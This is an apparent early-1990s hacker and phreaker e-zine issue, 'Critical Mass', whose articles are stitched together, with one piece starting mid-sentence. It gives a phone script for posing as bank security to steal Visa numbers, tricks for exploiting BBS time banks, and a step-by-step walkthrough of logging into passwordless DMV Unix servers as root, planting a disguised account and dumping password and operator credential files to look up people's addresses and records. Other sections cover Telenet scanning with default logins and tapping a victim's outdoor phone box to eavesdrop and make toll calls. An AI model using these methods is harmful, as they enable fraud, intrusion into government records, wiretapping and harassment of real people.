        Yes, Yes, Yes.... Welcome one, welcome all to yet another Critical
Mass.... What do you say that we stop and take a look around us for a 
moment..........

        
        God... It seems that we have come upon yet another Xmas. We all
knows what this means... More public mail like "HI, MY NAME IS TIM. tHIS
iS MY FIRST TIME ON A bBS!". Which will lead to, "wheres the k-k00l killer
kean warez!"... Ahh, well.. we all have to start somewhere.

         
        
        To thoughs whom do not know, UnRegNet IS underway! Yes, thats right
Tallahassees first echo on the topics of P/Hacking, Piracy, Explosives, 
drugs, and just general all American chaos is discussed. I want to get a
little something straight here, before some people start posting "killer 
k0dez" and stuff on the echo.... The echo is legit... Yes, it is total
legal, which basicly means that you cannot post information that is 
of a illegal nature....<I.E. - Credit card numbers, hack accounts/codes,
etc>..... However, since we do live in a country where we can all yell at
any given point in time, "I plead the 5th", and along with the great 
tradition of, "Its information, thats all.... You have heard of the first
amendment you S.S. commie swine you?", you can discuss the method of general 
hacking...... 
                           
        We also invite other people to get involved in the echo, such as 
Computer Security Specialist, and people whom are against p/hacking in 
general.... We <Well most of us> love to hear the imorals of hacking. 
If you even got a gripe about the whole thing, please do tell... Let me 
state again, however, that this is a legal net, and not a flame echo... 
Keep it within reason...... If you do have a gripe, please leave it in the 
Anti-Hacker area only...  
        
        In other local news, the local community has lost some great BBS's
in our local area. One of which was Section 8's old BBS along with the 
viral collector king, Dr. Strangelove. 

        I found this out the other day.... Seems that ole Centel is trying
to pull a fast one on there ANI <Automatic Number Identifiers> dialups. 
DM and I embarked on a 3 digit scan to find Centel's new ANI's. Low and
behold, after scanning over 700 numbers, they move the damn ANI to a 
4 digit exchange!
        Welp, considering that there is no need for you to do the work <and
besides the fact, I got the new ANI while looking over a Centel linemans
shoulder!>, here it is.... Dial 7118. What is ANI you ask? Well, I will let
you dial it and decide... Basicly, this will tell you any fone number <Within 
Leon County> that you are dialing from.... 


        Heres some other information that was not enough to make it to 
actual articles. Actually, some of them I heard/read about, but I will
share with you anyway. 

        
Fact: FDLE's <Florida Dept or Law Enforcement> database is ONLY 2 gig!        

        
        Every want a credit card number <Visa, Mastercard, Etc>, but just
just could not find the means? Welp, here is what you do. Pull the following
social engineer........ First go to a fortress/loop/whatever!


Mark    -       "Hello."
You     -       "Yes, This is Dave at CitiBank Security. We have seem to
                 have had a computer break-down and there is a problem with
                 your VISA and you will not be able to make anymore trans-
                 actions until it is re-entered. Can you give me you VISA
                 number?"
Mark    -       "Ahhhh, I don't know, this sounds a little fishy, buddy.
                 I got a idea, how about I call you...."
You     -       "I understand that you are reluctant. Here you go, this is                 
                 my office number. <Give him the Fortress/loop/whatever
                 number>"
Mark    -       "Okay, bye."
You     -       "Goodbye."


        <Wait a little while>

        RING!

You     -       "Citibank Security, This is Dave, how may I help you?"
Mark    -       "Ahh, okay.... I thought this might be a scam or something.
                 Anyrate, my VISA number is blah, blah, blah....."


        Easy as that. 

        I don't know about you, but if you want LD codes/extenders, VMB
        passcodes, etc, there is one really neat way to do it. I was 
        reading a few days ago in Phrack, or maybe it was Phun. Anyrate, 
        They had a article on using scanners to intercept fone <Cellular,
        Portable and Airline> conversation, along with other freq's, 
        such as bugs, FBI, etc, etc. Now, lets say you hooked up a tape
        recorder to you scanner via the earfone jack and recorded stuff.
        Lets say, you drop into Airline fones. You are gonna get codes!
        The same with cellular and maybe even portable fones. I know what
        I want for Xmas!


        Centel looks like it will be finally bought out by US Sprint! Centel
        has been quoted as saying that they would not upgrade Leon County
        telefone equipment until they where sure that US Sprint was indeed 
        going to buy them out. This explains alot of the trouble with our
        local telefone system here. 

        Speaking of trouble, in the 385 trunk, some of you that are in it
        may experience trouble in that your calls will seem to be "diverted"
        <The remote fone rings then you get a dialtone before the remote
        party answers> or get other peoples conversations. I called Centel
        and talked to a tech there, this is what he has to say.....


        "Yeah, on the 385 trunk, in some areas, when it get moist out
         the lines cross over, thus shorting out."

        "When will it be fixed?"

        "Thats hard to say, seems that it is a tough problem to fix. Tall-
         ahassee only has on prefix in town that has fiber optics. There
         is really no telling."

         I believe the prefix he was refering to was the 942, though I
         am not sure at this time.

        According to Tallahassee local news, DMV <Dept. Of Motor Vec.> is                           
        changing its format used on there local computer systems. It seems
        that more people will have access to your driving records. The new
        system will give information pretaining to tickets, DUI, expired
        tags, etc, etc. The majority of the users look like they will be
        people like Budge Rent'a Car, and other car rentals. 
        The system will also work alot easier than it currently does.
        All one must know is the Name. Currently <See hacking DMV in this
        issue of Critical Mass>, one needs a alot of information such as
        VIN's, Tag numbers, specific dates, etc. What this will allow the
        curious hacker is a more than easy way to find out the same 
        information. 

                           
        Strange NUA:                           
        
        If you can, connect to the following NUA from your local Telenet/
        Whatever dialup...........

        224206    < its in the 3110 Telenet DNIC >

        This will give you a list of Hong-Kong flight schedules. Just
        fun to show you friends!

                           How To Bust Into Systems
                        (Time Bank Systems, That Is!)
                         By Black Knight (Of Course!)
                         ____________________________


        I'd  first like to let everyone know that I did not find all of these
by myself.  I was given how to do two of these by other people,  but I'm just
showing them so that you can  do  them  yourself;  I am NOT taking credit for
them.  Anyway, here they are:

  1) How To Get Extra Time With Searchlight
  
  With  one  of the older versions of Searchlight,  it came with a time bank
  that was EXTREMELY faulty.   The  only  things  you could do was withdraw,
  deposit, and quit.   Unfortunatly, since most people don't use Searchlight
  and don't have that old version,  this will usually not work.   But,  it's
  worth a shot.
        
  What  you  need  to start out with is to use all but three minutes of your
  on-line time.   Then go to the  Time  Bank.    In there,  you will want to
  deposit your time.   It will say how  much  time  you  have  available  to
  deposit  and  ask  you  how  much  you wish to deposit.   You will want to
  deposit as much time as  it  says  you  can,   probably about two or three
  minutes.   So type in "2" or "3".   BUT, don't press enter.  You know have
  to wait.   How long?   Well,  how about two or three minutes?   After  you
  think you're time would've run out, press enter.  It will exit you back to
  the  main menu of the Time Bank and say you have about 16000 minutes left.
  Good job!
        
  This Time Bank scam works on the  fact the the Searchlight Time Bank works
  on a cycle theory.   When you're waiting for the two or three minutes, the
  time bank is still clicking it's time away.   So after waiting,  your time
  remaining is actually zero or less.   So after  depositing  two  or  three
  minutes,   which you don't have,  you will definitly have a negative value
  for your time remaining.   This is where the cycle comes  in.    The  Time
  Bank essentially "thinks" that you have negative time.   and since that is
  obviously impossible, it just wraps your time around to the maximum value.
  Although  this  is  a  great  trick,  you are only allowed to deposit 2000
  minutes or so.  Oh well!
        
        
  2) How To Get Extra Time With HamBank
  
  This is a proven trick you  can  pull  with HamBank version 1.2.   This is
  extremely easy to do and takes virtually  no  effort.    A  user  of  mine
  suddenly  had 500 minutes remaining one day.   I said "How in the HELL did
  you do that?".    Of  course,   he  wouldn't  say,   so  I watched him and
  eventually figured out the trick.   Of course,  I drop his  time  down  to
  nothing after he does it, but it's worth a shot, isn't it?
        
  You first need to find a board that uses HamBank;  usually an RA,  QBBS or
  XBBS.   As soon as you log on, feel free to go right to the Time Bank.  If
  you already have some time in there,  withdraw all of it.   Then exit back
  to  the  BBS.   Now go back to the Time Bank.   Now you'll have around 100
  minutes or so...   doesn't really matter, but the more the better.  Either
  way,  once in the Time Bank the second time,  deposit all but five minutes
  of your time.   It will say  something  like  "Do you wish to deposit this
  amount?  (y/N)".  Of course, you press "Y" and then hit enter.  As soon as
  you hit enter, drop carrier.   Then call the BBS back.   You will have the
  same amount of time that you had when you return from the time bank  after
  withdrawing all you time, about 100 minutes or so.

  This works on the fact that HamBank is stupid.  Really!  After you deposit
  your time,  HamBank ASSUMES that you've done nothing while in the program.
  So  of  course,   it reports back to RA,  QBBS,  whatever that you've done
  nothing and to maintain the same  amount  of time as when you shelled out.
  BUT,  HamBank was even more stupid because it saved your  HamBank  banking
  account before you hung up.  Therefore, you have your 100 minutes or so in
  both RA AND HamBank.   But as I suggest that after doing this,  you do not
  log right back on.   Wait an hour or two and then log on so that the SysOp
  doesn't notice anything.  Give this a shot, it works great!
        
  
  3) How To Get Extra Time With Remote Access Timebank Service
  
  This is another scam, but I figured this one out on my own.  This is a lot
  like the Hambank scam,  but goes the opposite direction.    Although  most
  boards  these  days  don't  use  Remote  Access  Timebank  Service (hereon
  mentioned by RATS), this is still a good thing to do.
        
  First you need to find a board  that carries this Time Bank (usually an RA
  board <GRIN>).   Anyway,  once on, you need to start with about 30 minutes
  or so.   Enter the bank and deposit around 30 minutes.   Now, exit back to
  RA.  After returning to RA, go BACK to RATS.  Now, this time withdraw your
  deposited time.   After it "says" that it saved your  account,   hang  up.
  Call  back  the  board.    RA says that you have all your time back again.
  Enter RATS and you'll see that all  your time is still in there.   All you
  need to do is keep calling back the board, withdrawing time,  and  hanging
  up.  Lot's oh phun.
        
  This works by two facts.   First, RATS is old as a mother-fucker.  Second,
  RATS is more stupid than HamBank. When you deposit your 30 minutes into it,
  it  is  just  saving  your  account  in EXITINFO.BBS,  not the actual RATS
  account.   But when you exit back to RA,  that's when it saves.   And when
  you withdraw your time,  all  it's  doing  is editing the EXITINFO.BBS and
  when you hang up,  it assumes you've done nothing and it  goes  ahead  and
  exits without saving your account.   But of course,  when RA sees that you
  have some extra time, it will save your account and then hang up.
        
Try all of these out, they are great phun.  In the meanwhile, I'll be writing
my own Time Bank <GRIN>. Really though, if you figure out how to bust another

                                 Hacking DMV
                                By The Beaver
                              _________________


        This articles focus is on DMV <The Dept. Of Motor Vec.>, and
        the security around there machines..... It is fairly straight
        forward, and though I cannot say that all DMV machines are 
        the same, most servers probably are...... The machines discussed
        here are in the local <Tallahassee> area.
        --------------------------------------------------------------

        Ok, first off, you will want to find a DMV server, correct? 
        Well, As much as I would like to, I cannot give the number, 
        because everone would hack'em and that would be a major 
        hassle, plus the fact that someone would get busted....
        However I will tell you that one machine is located in the upper
        487 prefix. <Above the 5000 exchange>. The rest is up to you.

        DMV servers run under Unix, and it is unreal how easy to defeat
        there security is.... It is simply a matter of knowing what 
        username to type in. On the DMV servers I have played with, 
        there is NO passwords on ANY of the accounts... This includes
        root, sysadmin, who, uucp... You name it! Now, upon calling a
        DMV machine, here what should happen.. When you call it, you will
        have to wait a minute for the login prompt... Which should be
        look something to this......

        Northwoo
        2400 login:

        At which point, the first thing to do is login as root. Since DMV
        machines hold no password, you should become superuser quite 
        easily. After that, do a "who" <Shows all users online>, you will
        probaly see some non-interactive accounts on..... For saftey
        reasons, do not login during working hours! I prefer sometime at
        night.... Ok, after you look around a bit and see that you are
        getting nowhere, go ahead and "cat" <sorta like the "type" command
        on DOS and VMS machines> and capture the passwd file... This
        will be in the etc directory... For example, here is what you 
        would do....

        $ cd /etc
        $ cat passwd

        This will dump all the usernames on the system and along with 
        there encrypted password <this holds true with all Unix based
        systems>.... Don't worry about the encrypted passwords, because
        as I said, they don't use passwords at DMV! Here something 
        what you should get.....<BTW This is off a DMV machine>

        Actually for the articles sake, this is a bit edited so that
        it is not as long..... Now, lets take one of these guys and
        examine it.... 

        sarem:x:0:0:SA Menus Remote Execution:/sa:/bin/sh
         ^    ^               ^                        ^
    Username  Password<none>  Brief Discrition       Shell

        Now, look at the Shell field.... There are several types of 
        shells, such as sh <Standard Shell>, csh, and ksh <Kernal Shell>.
        What does this mean? Shell are nothing more than work areas. 
        That is, if you are one of those three shells, you can work
        at a Unix based level, meaning you are actually dealing with
        the operating system itself, similar to when you login under
        the root account.... You are working with Unix itself. Now
        lets look at another......

        sta10:x:110:201:Station Number 10:/FRVIS/OBJ:/FRVIS/OBJ/go
          ^   ^              ^                                  ^
    Username  Password    Brief Discription            Whats This!?!?

        Hmmmm, look at where are shell should be.. there is no sh, csh or
        ksh shell but rather "go" in the "/FRIVIS/OBJ" directory?!?

        Actually it is rather simple... It is a program that is executed
        at login, and this account has NO shell access. Look at it this
        way, at DMV they had a choice to make everyone learn Unix or
        create a simple menu system so that any idiot could us it <No
        offense to any DMV people, but it is the truth>. Before we
        go executing this menu system, would it not be nice to look like
        everyone else that logs in other than standing out as the root
        superuser? Heres what you do.... Logout and call back, this time
        login under "sysadm", with, of course, no password. Just follow
        instructions and make a new account, and call it sta50 or 
        something like that, so you won't stand out. Make it just like
        the other sta accounts <See the passwd file above>, BUT when
        it talks about a shell, tell it you want a "/bin/sh" shell, or
        what ever you desire. Once you have made your new account, quit
        and login under "sta50" with no password, and boom, you fit
        right in, if someone looks at ya! But wait, with a "sh" shell you
        are no longer superuser right? Wrong. If you hit any files that
        are out of your access to touch, type "su" <For superuser>, and
        of course, you will not be prompted for a password. Ok, thats
        out of the way.... You fit right in... Now, lets go back to 
        this "go" thingy that we were discussing above.

        <BTW I am aware of the fact that you can create logins using>
        <vi editor, but for the articles sake, we will keep it simple>
        
        Remember that the program was in the FRIVIS/OBJ directory, so
        simply type.....

        # cd /FRVIS/OBJ
        ^
        Note: I am SuperUser

        The cap's DOES matter.... When you see something in cap's, type
        it that way! Ok, now we are in this directory where the program 
        "go" is.... We are a bit curious to see what this "go" thang 
        does.. So type.......

        # exec go

        Here is what you should get.....

      NOTE: ENTER OPERATOR NAME AND ALLOWED FUNCTIONS AND PRESS RETURN.
             IF CORRECT, YOU WILL BE PROMPTED FOR YOUR PASSWORD.



        Oh, great! We have to login AGAIN! Never fear! Remember, we are 
        SUPERUSERS! So get out of this crap and re-login under your
        fake account... Now, considering that the above is actually a 
        program that is asking for a password, we know that the program
        must store the Usernames/Access levels/Passwords in a file.
        So re-login, at go to the following directory like this....

        # cd /FRVIS/DATA
        
        In this directory, you can get a file called OPERATER, that contains
        all the accounts that the people at DMV use...Once in this
        directory, type......

        # cat OPERATOR
        
        Now, cat the file called "OPERATOR", it should look like this..

00000199MAGGOT-1  MAGGOT070000
00000151UNISYS    UNISYS070000

        Now, to decipher this crap... Lets look at one.....

        00000199MAGGOT-1  MAGGOT070000
                  ^         ^      ^
              Username    Passwd  Access Level

        Ok, their username is Maggot-1, their password is Maggot and
        their access level is 7000. Let me explain a little more about
        how you came to this.... Go to the beginning of the string, now
        count 8 places out... You will land on the M... From here you 
        can see how I got maggot-1. Now, move to the second maggot, and
        go up to the first 0 you hit. Now anything past the zero is
        the level... The lower the better..... Use levels 3000 preferably.
        Here, let look at another......


        00000135NAME35    PASS35070000
                  ^          ^     ^
                User      Passwd  Level

        So the username is....... NAME35, Password35 at level 7000
        <or what ever they call it>. 

        Now we can use DMV as it is supposed to be used. So go back to
        the directory FRVIS/OBJ and execute go. Now when it asks you for
        a operator name and password, you will know exactly what to do!


        Before I leave you off hack'in  DMV, let me state that DMV is
        NOT in anyway fun to use. You must supply VIN's, Registration
        dates, and it just a pain in the ass... The advanages are that
        you can find out where people live, fone numbers <Private/
        Non-Private line>, driving records, tag numbers, police cars
        tag numbers....... Alot of shit! Chow!

   Some things to do while online with Telenet and Tymnet.  While at the @ on
the Telenet system type "mail" or "C mail" or "telemail" or even "c telemail" 
this access's telenets mail system simple entitled "Telemail" from there it 
will ask "user name" or something like that type "phones" next it will prompt 
you "password" enter "phones".  The phones service has alot of worthy 
information it will give you a menu to choose from the rest should be self 
explanatory.  Along with the other information on the phones service there 
is a complete updated list of all Telenet access numbers which is conveinent.  
Once you have tried the phones service also on telemail enter 
"Intl/Associates" as the user name and "Intl" for the international access 
numbers.  If you are calling from overseas somewhere connect with an telenet 
 access number then type this Nua at the telenet @ prompt "311020200142" and 
enter the username and password.

You might want to pick up a sort of a reference booklet on Telenet simply 
again call the customer service number and ask them for "How to use Telenet's 
Asychronus Dial Service" and give them your address which is self 
explanatory. Another tidbit of info you would like to know if you already 
didnt know that Telenet is owned by Us Sprint long distance service.


     another way to obtain access to this network from your home or apartment
     even a phone booth, you first need to know a number to connect to.
     The international number is as follows: 1-800-424-9494, And the local
     access number for telenet is 561-8830 E71 You need to
     have your modem settings at E71 and your terminal at VT100, after you
     connect you will see 'TERMINAL=' at this prompt you need to enter a
     '@' and then press enter, you should then get a '@' at this prompt
     enter your telenet address let's say we tried '655321'

     EX: @ 655321

     blah blah blah  CONNECTED!

        Virgin Island Coast Guard

        Login> hack it!
        Password> hack it!

     After you have tried unsucessfully a few times, it will proceed to
     bump you off so do not be alarmed by it, disconnection will (should)
     occur after the incorrect password, not during entering a user or such
     after you get booted it will send you back to the telenet prompt '@'
     where you can again enter another address.


     The first thing your going to have to have is your Access number it is 
     very easy to get your local access number.  Simply call telenet at 
     1-800-TELENET that is thier customer service number and ask for your 
     dialup the operator will ask for your area code and prefix of your phone 
     number he/she will also ask your baud rate.  There are many telenet 
     ports across the country and internationly with varying baud rates 
     from 110 bps (yuck) to 9600 (i wish i had) so you will want your 
     maximum baud port most locations have atleast 1200 many have 2400 and 
     not alot have 9600 ports like for big cities like Detroit and Los 
     Angeles at the end of the file i will list some useful numbers.

I. HOW TO USE THIS NETWORK

     How to use this network was explain in short detail above, however ther
     is more to the explainations on how to use this network, if you try to
     enter just shit at the telent prompt '@' it will not recognize it, it
     will come up with a '?' write under your telenet prompt, all the prompt
     will except is address. Also not explained already is the format of
     address, all address are not in the format of xxxxxx (6 digits) you
     can have address like 123456.7, and so on, This is a clever little way
     to find a back door to a system, let's give another example.

        EX: 123456
        REJECTING CONNECTIONS, TRY BACK LATER

     Well yeah, it's true telenet address 123456 is rejecting, but
     possibly 123456.5 isn't, and that is your way into a system
     however, this doesn't always work. So you may end up logging
     off and trying back later. Error messages are always going to
     be learking around just waiting to get in the way of your hack
     so I put together a few to watch for, and a brief explanation to
     them in topic III

Here is some little tid's n' bit's of shit that could help alond the way:

Telenet Costumer Services 1-800-TELENET
Tymnet Customer Services 1-800-872-7654
Local Access Number 561-8830 2400bps.

III. - SCANNING THE TELENET NETWORK

There are hundreds, hell even thousands and thousands of address, some to bank
systems, some to airport scheduling, and even NASA, ranging from 333 to
a address like 9999999, so if you are a real serious telenet'r you should get
some software made to scan telenet. There is a program currently out in the
Local area here called TSCAN*.*, put out by 'The Beaver', a member of the
SAOO, you can get access to this software on a few boards, it may require
asking around. After you get the software you need to configure it to your
standards, then begin scanning adresses, TSCAN is fairly easy to use and
will auto log the address scanned and the systems found on telenet, This is
by far the best scanner you can get currently

                   ______________________________________


        A while back, I was scanning around on telenet to find 
        something to work on... This was during my "thousand"
        scan, and while scanning I hit a CitiCorp machine. 
        After a little bit of research, I found a pattern to        
        there machines, and was able to find CitiCorp cash
        management machines, banks all over the world and 
        mail systems around the world...The following are 
        reachable though Telenet. If you have no idea about 
        Telenet, please read CM#6 and CM#7 <SAOO Telenet Scans> 
        for more information.

Information on Telenet:

        
     The First thing you need to do is obtain a dial up list. To do
this, call 1-800-424-9494 <1200 7E1, or 1200 8N1 with high bit
striping on>. Once on, you will receive a "TERMINAL=", which at 
this point, enter your terminal type, or just press return <TTY>.
        You will now get a "@" prompt. From here type "c mail". At 
the "Username?" prompt, enter "phones" and the same for the 
"Password?" prompt. At this point, simply follow the directions, 
and you will get your local dialup<s>. One thing I would like to 
note, when using the 300/1200 dialups, when you connect, simply hit 
return a few times. When using the 2400 dialups, you must enter "@" 
followed by a carriage return. 

        For more information on Telenet, I advise you to get 
Hacker's Unlimited issue#1 or LOD/H Technical Journal for more
information on Telenet. I did not wish to make this a text file on 
Telenet, but rather a directory of listings scanned by myself and 
fellow S.A.O.O members. These texts can be obtained via The Tower 
of Power BBS <668-6745> and The Speed Shop <XXX-XXXX) 14.4k

-----------------------------------------------------------------------------


        Ok, the following is what I call the "Thousand" scan. I know that
if you are on UnRegNet you have probably seen this scan, but for the
people who have not, this is what was hit during that scan. <These scan
points to no origin, and there are lots of interconnecting machines, but
due to the articles sake, we will not include all those interconnecting 
machines>.

nitroglycerin for those unfamiliar) naturally they would get somewhat
suspicious, so I have decided to submit MY article about:
WHAT 13 YEAR-OLDS (OR ADULTS WHO ARE UN-WILLING TO DO THE OTHER SHIT)
CAN DO THAT IS PHUN AS PHUCK

1.) Phreaking: 
This is a slightly technical thing but so easy it is worth
it to try, Ya' know the side of your house (and everyone elses) that has
all those wires running in and out of the house? well it is usually
on the right side and It controls CATV (Cable), Phone services, and some
other uninteresting shit (like electricity in some cases) well the obvious
thing to do is use this to your advantage. 

1. a.) Using The Phone Box:
Once you know where the green box outside on the wall is, it is the
cube that is hollow plastic and has a single nut in the center. Inside 
of this is the phone in and outputs of their house (for most people)
there is 2 wires each attached to a screw looking thing (usually one red
and the other is green).

1. a. I.) How To Use This To Your Advantage:
You must build a VERY simple circuit. What you do is go to Radio Shack (or any
place where you can buy phone shit, Sam's has best prices) and purchase
a phone wire (at least 3ft. long but if its too short you will be confined, and
too long it will be cumbersome). Then get a hold of some alligator clips (I know
that Radio Shack has good prices on these helpful devices).

Directions:

1st: Cut the wire in two

2nd: Remove a few inches (3"-5") of that beige/yellow jacket on the wire
     to expose the Red, Yellow, Green, & Black wires

3rd: Strip these wires 
                           
                     your wire should look like this
                         Red 
 Modular Plug             | _ Green
 []=======================|<_ Yellow
                          |
                         Black

4th: Now put an alligator clip on each of the exposed wires

You have now completed the simplest hardware device of your Phreaking collection
All you have to do now is buy one of those cheap phones that all the guts are
contained in the headpiece and the base just has a wire running along the
bottom, take the base off of the wire and take the wire out of the phone
and insert the modular end of your wire into the now open port on the phone.

1. b.) Using The 'Lineman Circuit' With The Phone Box:
Go out late at night (2:00am is about right) and roam around town until you
find a suitable victim, preferably someone you hate When you find
him/her go to the side of their house and open the box by unscrewing the nut.
You may need some pliers, but 90% of the time you will be able to use your
hands (Sometimes there will even be a piece of paper stating their phone
number). Clip your clips onto the apprepriate post  (Green to Green,
and Red To Red is usually all there will be). Make sure when you do this that 
the hangup button is down so if (at 2:00 am) someone using
the phone doesn't detect you. Then Press the 'MUTE' Buton and keep it down
and release the hang up button. Check to see if there is a dialtone, if
there is, we're in business if not you didn't securley clip the clips on the
post (DO THAT!!!, AND start over from the 'mute' part). If you hear someone
speaking it is sooooooooooooo phun to hear the conversation someone has at 2
in the morning (you could hear 1-900, drug deals all sorts of shit).

1. b. I.) What You Can Do When You Get A Dial Tone:
1. You can make toll calls
2. Prank calls (the Sherriff, Police, FBI, CIA, White House, and
   Kremlin are my faves)
   And if you have a Laptop w/modem you can call log distance boards

2.) Fucking Around With Their Cable:
You can easily disconnect their cable and deprive trekkies of Star Trek or
Perverts of XXX movies or whatever, and after about 2 days they will be 
willing to pay YOU money to get it up-and-running 
although the sheer joy of watching your enemies be miserable should be payment
enough. And if you are a real thrill seeker, you can pump shit into their TV with
a camcorder you can pretend to be a terrorist taking over the TV network
or some shit like that.

Greetings, fellow CompuDude....
I have un problem....
I called that 1-800-424-9494 # at 12007E1 and all I got was a 'you have 
dialed a number that is not avalable from your calling area 205-5T'  message.
Any suggestions?

        I will have to check it out... try one of these numbers....
        
 
        800-546-1000
            564-2000
            564-6000
 
        Actually, the first one might really be 564, if not 546.. Try it,
and if it don't work try the others... But considering that you will  be
coming in on a WATS telenet PAD, your range with be limited.. Try  these
other local dial ups for more range.. 
 
        1200 bps only
        7E1 or 8N1 with high bit stripping on...
 
        681-1902 though 681-1907 <On Rotary>
 
        2400 bps, same settings as above.
        
        561-8830
 
        Thoughs will give you better range. If you are planing on  checking
out some of the NUA's given  in CM#7, keep in mind that they do go bad.... 
Though the list should be fairly fresh and you should hit very little, to no
problems. If you are planning on doing your own scans, I believe I neglected
to mention, but Tscan Version 1.1i Beta will not work on slow machines.
I tested it on my 386/20 and it works fine. Plus there are a few other bugs, 
but nothing big, and Tscan2.0i will be out within the next week or two and 
will have all bugs fixed, plus it is compatable with a batch more scan,
scan, randomized telenet port dialing, and will run on slower machines 
<Currently works on a 8086 / 8.> Welp, tell me what ya find and have a 
blast! Chow!

Hey beav,
    I d/led the CMASS 7 from Spellbook earlier.  Truthfully, it sucked.  HAHA
NOT!  No really it was more than i expected! Well if you are interested in me
being a part of the SAOO (cuz i am interested), then please (polite eh?) leave
me whatever your supposed to leave me for application.  Call XXX-XXXX voice,
and if you like ill let you on to my bbs.  Also, can you give me more info on
how that telenet scanner works?  ive read the docs, and there kinda confusin. 
Also i have no idea what that Phill shit is, but i copied it to my utility
directory anyhow.  Annnnnnnnnnnnnnnnnnnnnnnnnd... well hmm... now what was i
gonna say...oh what are those numbers for the , Speed Shop,
and SAOO Main BBS?  they all say 904-pri-vate.  There's 1 more, i cant think
of.  Can you give me the numbers to all the private ones if you are allowed
to?  Ill fill out some application if i must...i was on your bbs back in
march, last thing you told me was you got C++ and it was 10 megs and you would
post it, but ya hadta get a bigger drive and BOOM there goes the upper deck.
Anyway, please get back to me on all of the above shit.  Thanx!!!!!!!!!!

        Welp, Tscan1.0i and Tscan1.1i are a little buggy, so I advise down-
loading version 2.1i, because of the fact that it will work on slower
machines if need be. 
        I understand that the DOC's where rather confusion, and I hope
the the doc's in version 2.1i will explain a little bit more, and clear
up somethings....... I advise that you run it on the fastest machine 
you have avalible to you, so that it scan clean. If you have version 
2.1i, the best way to figure out how it works is to just watch it in 
action. Execute Tscan2.1 and make sure that your setup is right. Once you
are sure of that, go to the "Start Scan" selection.. Now it will ask for
a Starting Address <NUA)and a ending.... Just to see how it works, scan
212000 - 212999. After watching it for a while, you will probably get the
hang of what it going on.
        About phill.. It is what as know as a VAX/VMS Rightslist filter. 
What is a rightslist? Simple, it is a file that stores the rights for
users. What does this mean? On a VAX/VMS, this is where you can obtain
all the users on the computer that you have just broken into. The major
problem is that once you download <Or capture> the rightslist, it tends
to be a little messy. That is where programs like Phill, RlFilter, and
RIF come in. They take out the garbage in the Rightslist. I will probably
have a article in the future discussing this in more detail, but for
those familar with VMS, the Rightslist can be obtained in the following
way......

Type sys$common:[sysexe]rightslist.dat

        Don't forget to open a capture buffer!


        About the BBS's.................... 
        
I cannot give the fone numbers out to you, but I will point you in the 
right direction...... 

        Contact Shadow Hacker, Electrode or myself about the Speed Shop 
<Running on a Amiga >. We can be reached on any UnRegNet BBS, through UnRegNet.
There are a few other boards you might wish to get on, but considering that 
I cannot vouch for these BBS's, I probably should not release there phone
numbers........ You will have to get them your own way...


        The following is a list of current SAOOWear Releases, that you 
can find on some of the BBS's previously listed. 

        Phill v2.0      -       VAX/VMS Rightslist Filter.
        Iwar v1.0Beta   -       Intelligent Wargame Dialer V1.0 Beta.
                                determines remote OS's for you.
                                <Find De Bugs Version>
        Tscan v2.1      -       SAOO Telenet Scanner V2.1
        DvBoot v1.0     -       Automatic window closer for DesqView
        UnixFlt v1.0    -       Filters Unix Passwd files, leaving only
                                the usernames behind.

        Noted Bugs:

        It seems that the "Clear Modem Buffer" routines in the beta 
        version of Iwar v1.0 causes some machines to crash.

        In Tscan v2.1, there is a bug in where terminal breaks are not
        sent when using com ports other than com 1.
        

        This concludes yet another issue of Critical Mass. As usual, I 
hope you enjoyed it, and will be looking forward to the next Issue. 
Hopefully we can get the next issue out faster than it took to get this
issue... In the next issue of Critical Mass, expect more NUA scans
on Telenet, along with Down And Dirty Chemistry Part 2 and much more!
